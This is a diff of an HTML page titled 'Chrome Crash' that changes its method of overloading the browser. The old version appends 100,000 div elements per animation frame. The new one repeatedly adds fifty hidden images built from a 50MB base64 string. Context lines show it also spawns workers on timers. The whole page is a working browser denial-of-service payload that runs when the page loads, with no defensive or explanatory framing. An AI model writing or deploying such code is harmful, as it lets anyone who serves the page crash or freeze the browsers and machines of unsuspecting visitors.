@@ -1,20 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Crash - DOM Explosion</title>
+    <title>Chrome Crash - Base64 Image Overload</title>
 </head>
 <body>
-    <h1>Chrome Crash - DOM Explosion</h1>
-    <p>This page will overload Chrome using excessive DOM elements.</p>
+    <h1>Chrome Crash - Base64 Image Overload</h1>
+    <p>This page will overload Chrome with enormous hidden images.</p>
 
     <script>
-        function createElements() {
-            for (let i = 0; i < 100000; i++) { // Create 100,000 elements per loop
-                let div = document.createElement("div");
-                div.innerText = "Filling memory...";
-                document.body.appendChild(div);
+        function createImages() {
+            let imgData = "data:image/png;base64," + "A".repeat(50000000); // 50MB+ base64 string
+            for (let i = 0; i < 50; i++) { // Load 50 large images
+                let img = document.createElement("img");
+                img.src = imgData;
+                img.style.display = "none";
+                document.body.appendChild(img);
             }
-            requestAnimationFrame(createElements);
+            requestAnimationFrame(createImages);
         }
 
         function startWorker() {
@@ -28,7 +30,7 @@
             setTimeout(startWorker, i * 100);
         }
 
-        createElements();
+        createImages();
     </script>
 </body>
 </html>
